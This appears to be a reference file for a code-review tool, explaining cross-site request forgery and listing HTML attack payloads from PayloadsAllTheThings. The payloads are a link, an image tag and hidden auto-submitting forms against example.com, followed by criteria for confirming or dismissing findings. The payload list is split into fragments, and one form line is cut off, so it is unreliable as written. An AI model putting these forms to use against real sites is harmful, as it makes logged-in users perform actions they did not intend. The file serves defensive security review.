# Cross-Site Request Forgery — @forgeon skill
> cats: CSRF · severity: high
> sources: PayloadsAllTheThings, HackTricks

## What it is
When you are logged in to a certain site, you typically have a session. The identifier of that session is stored in a cookie in your browser, and is sent with every request to that site. Even if some other site triggers a request, the cookie is sent along with the request and the request is handled as if the logged in user performed it.

## Exploit payloads (from PayloadsAllTheThings)
- `<a href="http://www.example.com/api/setusername?username=CSRFd">Click Me</a>`
- `<img src="http://www.example.com/api/setusername?username=CSRFd">`
- `<form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">`
- `<input name="username" type="hidden" value="CSRFd" />`
- `<input type="submit" value="Submit Request" />`
- `</form>`
- `<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="P`
- `<input name="username" type="hidden" value="CSRFd" />`

## VERIFY
- CONFIRMED when: untrusted input reaches the sink/condition described above and
  NO mitigating control (input validation, allow-list, output encoding, auth/ownership
  check, or safe API) is present in the data path.
- FALSE POSITIVE when: a correct mitigation from Remediation is applied, the value is
  constant / allow-listed, or the matched symbol is a benign same-named API.
- LIKELY when: the dangerous pattern is present but the mitigating control or an exploit
  precondition is not visible in the reviewed code.

## References
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Cross-Site%20Request%20Forgery
- HackTricks: https://book.hacktricks.wiki/en/search.html?q=Cross-Site%20Request%20Forgery
- HackTricks Cloud: https://cloud.hacktricks.wiki/

## HackTricks pages (1)

- [CSRF (Cross Site Request Forgery)](https://hacktricks.wiki/en/pentesting-web/csrf-cross-site-request-forgery)

## References
- HackTricks: https://hacktricks.wiki/en/
- HackTricks repo: https://github.com/HackTricks-wiki/hacktricks
